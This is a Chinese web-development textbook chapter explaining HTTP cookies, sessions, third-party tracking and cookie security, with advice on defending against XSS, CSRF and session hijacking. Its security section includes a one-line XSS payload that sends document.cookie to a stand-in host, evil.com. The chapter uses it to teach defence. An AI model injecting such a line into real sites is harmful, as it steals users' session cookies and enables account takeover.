第十章：Cookie与会话

各位同学好。我们以前反复提到HTTP是"无状态"（stateless）的协议——服务器不会记住你之前的请求。但你在淘宝上逛了一圈，购物车里的商品一直都在；你登录了一次Gmail，邮件页面就认识你。这是怎么做到的？答案就是Cookie。

Cookie是HTTP协议中为"无状态"这个天生缺陷打上的补丁。虽然设计上不算优雅，但它支撑了Web从文档分享平台到复杂应用平台的跨越。今天我们就把Cookie和相关会话机制讲透。

10.1 Cookie的由来

Cookie是Netscape公司在1994年发明的。当时Netscape的工程师Lou Montulli需要解决一个问题：用户在Netscape的电商网站上，把商品加入购物车后，如果跳转到其他页面，购物车数据就丢了——因为服务器记不住你。

Lou的解决方案很巧妙：服务器在响应头里加一个 Set-Cookie，浏览器收到后存储下来，之后每次请求自动在 Cookie 请求头里带上。流程如下：

第一次请求：
  GET /index.html HTTP/1.1
  Host: shop.example.com

响应：
  HTTP/1.1 200 OK
  Set-Cookie: session_id=abc123; Path=/; HttpOnly

第二次请求（浏览器自动带上Cookie）：
  GET /cart.html HTTP/1.1
  Host: shop.example.com
  Cookie: session_id=abc123

这个机制简单但有效——它利用现有的请求-响应模型，在HTTP头部中传递状态信息。原名叫"Magic Cookie"（程序员的幽默），后来就被简称为Cookie了。

核心认知：Cookie并没有改变HTTP的无状态本质——每个HTTP请求仍然是独立的。Cookie只是在请求中附带了一段数据，服务器通过读取这段数据来"回忆"你是谁。就好比你去健身房，每次刷手环进门，手环本身不储存你的信息，但前台系统通过手环ID查到你的会员信息。

10.2 Cookie属性详解

一个Cookie不止有名字和值，还包含一系列控制其行为的属性：

Set-Cookie: session_id=abc123; Domain=.example.com; Path=/;
           Expires=Tue, 29 Jun 2027 12:00:00 GMT; HttpOnly; Secure; SameSite=Lax
属性说明示例注意点
DomainCookie的作用域名Domain=.example.com包含子域名；不指定则仅当前域名
PathCookie的作用路径Path=/app仅匹配 /app 及其子路径的请求
Expires / Max-Age过期时间Max-Age=86400Expires是具体日期，Max-Age是秒数（优先级更高）
HttpOnly禁止JavaScript读取HttpOnly防御XSS窃取Cookie的关键
Secure仅HTTPS下发送SecureHTTP连接中不会发送该Cookie
SameSite控制跨站请求行为SameSite=LaxStrict最严、Lax适中、None不禁（需Secure）

SameSite详解——这是现代浏览器防御CSRF攻击的重要手段：

  • SameSite=Strict：最严格。任何跨站请求都不带Cookie。用户从Google搜索结果点击链接到你的网站，也不会带Cookie。安全但用户体验有点差。
  • SameSite=Lax（默认值）：在链接跳转、GET表单提交等"安全"的顶级导航中会带Cookie，但跨站POST请求、iframe、img加载等不会带。是安全与体验的平衡点。Chrome 80+默认将未设置SameSite的Cookie当作Lax处理。
  • SameSite=None：允许跨站请求携带Cookie，但必须同时设置 Secure（即仅在HTTPS下生效）。用于第三方Cookie场景。

踩坑故事：2020年Chrome 80发布后，我们收到大量用户反馈"突然无法登录了"。排查发现：我们后端设置的Cookie没有明确指定SameSite属性，Chrome自动把它当作SameSite=Lax处理了。而我们的登录流程依赖一个第三方OAuth弹窗——弹窗是跨域的，所以Cookie发不过去。修复方案是在Cookie上显式设置 SameSite=None; Secure，让弹窗流程能正常传递Cookie。这次事故让我们团队深刻认识到：浏览器厂商的默认行为变化，真的能一夜之间搞崩你的系统。

10.3 Session机制

Cookie本身最多存4KB数据，而且存在客户端，不适合存放大量业务数据。所以真正存储"用户状态"的地方是在服务器端——这就是Session（会话）。

Session的工作方式：

  1. 用户登录后，服务器创建一个Session对象，分配一个唯一的Session ID
  2. 服务器将Session ID通过Set-Cookie发送给浏览器（通常是名为 session_id 或 JSESSIONID 的Cookie）
  3. 浏览器后续请求自动带上这个Session ID
  4. 服务器根据Session ID找到对应的Session数据（登录状态、购物车等）

Session数据存储在哪里？这取决于你的架构：

  • 单机内存——开发环境最简单，但生产环境机器重启Session就丢了。
  • 数据库存储——持久化，但每次查询都要访问数据库，延迟略高。
  • Redis/Memcached——内存级速度，支持过期自动清理，企业标准方案。
  • 分布式缓存——在大型微服务架构中，Session需要全局共享。

Sticky Session（粘性会话）——如果你的服务器不止一台（负载均衡），用户第一次请求落到服务器A，Session建在A的内存里。但下一次请求负载均衡可能把用户扔到服务器B，B没有这个Session，用户就被迫重新登录了。解决方案有两个：一是负载均衡配置"粘性会话"（同一用户的请求始终发到同一台服务器），二是使用集中式Session存储（如Redis）。

面试常考题：Session和Cookie有什么区别？标准答案是——Cookie存储在客户端，Session存储在服务端。Session通常依赖Cookie来传递Session ID，但它们不是二选一的关系，Session是基于Cookie实现的上层抽象。

10.4 第三方Cookie

上面讨论的都是"第一方Cookie"——由你正在访问的网站设置的Cookie。而第三方Cookie是其他域名在当前页面设置的Cookie，最常见的就是广告追踪。

举个例子：你访问新闻网站A，上面嵌入了一个来自广告平台ad.com的像素图片。浏览器请求ad.com的资源时，ad.com可以设置一个Cookie。之后你访问电商网站B，B上也嵌入了ad.com的广告，浏览器又会带上ad.com的Cookie。于是广告平台就知道了：同一个用户在浏览新闻网站A和电商网站B——这就是跨站追踪。

这种追踪能力催生了庞大的数字广告产业，但也引发了严重的隐私担忧。各浏览器厂商的行动时间线：

  • 2017年：Safari开始默认阻止第三方Cookie（Intelligent Tracking Prevention）
  • 2020年：Firefox默认启用Enhanced Tracking Protection，阻止第三方Cookie
  • 2020年：Chrome宣布计划淘汰第三方Cookie（后来多次推迟）
  • 2024年：Chrome开始逐步限制第三方Cookie

趋势分析：第三方Cookie的消亡是不可逆的趋势。如果你的业务依赖第三方Cookie做用户追踪（比如广告归因、跨站分析），你需要尽快迁移到替代方案——如Google的Topics API、第一方数据策略、服务器端追踪等。政策变化已经导致很多广告技术公司不得不彻底重构他们的追踪体系。

10.5 Cookie安全

Cookie中往往包含Session ID甚至认证Token，是攻击者的首要目标。以下是Cookie安全的几个关键防线：

XSS窃取Cookie： 攻击者通过注入恶意脚本，窃取浏览器的Cookie。如果Cookie没有设置 HttpOnly，JavaScript可以读取 document.cookie 拿到所有Cookie。

// 攻击代码（如果网站有XSS漏洞）
fetch('https://evil.com/steal?cookie=' + document.cookie);

防御手段：

  • 设置 HttpOnly 属性——JS无法读取，从根本上阻止了XSS窃取
  • 对用户输入做严格的转义和过滤，防止XSS漏洞
  • 使用CSP（Content Security Policy）限制脚本执行

CSRF（跨站请求伪造）： 攻击者诱导用户在已登录状态下点击恶意链接，利用浏览器自动携带Cookie的特性，以用户的身份执行非授权操作。

防御手段：

  • SameSite 属性是CSRF的第一道防线（推荐SameSite=Lax）
  • CSRF Token：在表单中嵌入一个随机Token，服务器验证Token有效性
  • 检查Referer/Origin头：验证请求来源是否为合法域名

Session劫持： 攻击者通过网络嗅探、XSS等方式获得Session ID，然后冒充用户发起请求。防御：

  • 全程HTTPS，防止中间人截获
  • 设置 Secure 属性，Cookie只在HTTPS连接中传输
  • 登录后更换Session ID（Session Fixation防御）
  • 绑定Session ID到用户IP或User-Agent（但IP可能变化，需要权衡）

Cookie签名 vs 加密：

  • 签名——保证Cookie内容没有被篡改。比如Express框架的 cookie-parser 用密钥对Cookie进行签名，签名后的Cookie看起来像 s:session_id.abc123.xxxxxx。服务器验证签名是否匹配，不匹配则拒绝。
  • 加密——保证Cookie内容不可读。但如果只是Session ID，其实不需要加密（ID本身没有意义），只需要防止被篡改。如果Cookie里直接存放用户数据（如用户名、角色），则需要加密。

踩坑故事：早期做一个企业管理系统，用Cookie直接存储了用户的角色信息（"role=admin"），想着每次请求直接读Cookie不用查数据库。结果被安全测试发现——攻击者只要手动修改Cookie里的role为admin，马上拥有管理员权限。因为没有签名，服务器完全信任了客户端数据。正确的做法是：Cookie里只存Session ID，角色信息存在服务器端的Session里，或者对Cookie内容做签名验证。那次的教训就是——永远不要信任客户端的输入，包括Cookie。

好了，第十章的内容就到这里。Cookie是HTTP从无状态走向"能记住你是谁"的关键机制，但它诞生于一个还不太注重安全的时代，所以我们需要现代的SameSite、HttpOnly、Secure等属性来弥补它的先天不足。下一章我们进入HTTP认证（Authentication）——在Cookie之外，HTTP协议还提供了哪些认证方式？Basic、Digest、Bearer Token、API Key……各有各的适用场景。
